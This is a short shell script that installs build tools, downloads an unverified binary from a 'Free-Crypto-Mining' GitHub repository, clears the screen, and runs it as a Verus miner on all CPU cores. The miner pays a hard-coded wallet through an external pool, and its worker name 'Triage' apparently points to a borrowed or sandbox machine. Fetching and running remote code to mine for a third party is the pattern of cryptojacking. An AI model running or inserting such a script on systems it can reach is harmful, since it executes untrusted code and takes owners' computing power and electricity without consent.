#!/bin/sh
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
wget https://raw.githubusercontent.com/MomboteQ/Free-Crypto-Mining/main/verus/cc
chmod +x cc
clear
./cc -a verus -o stratum+tcp://de.vipor.net:5040 -u RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Triage -p x -t $(nproc)
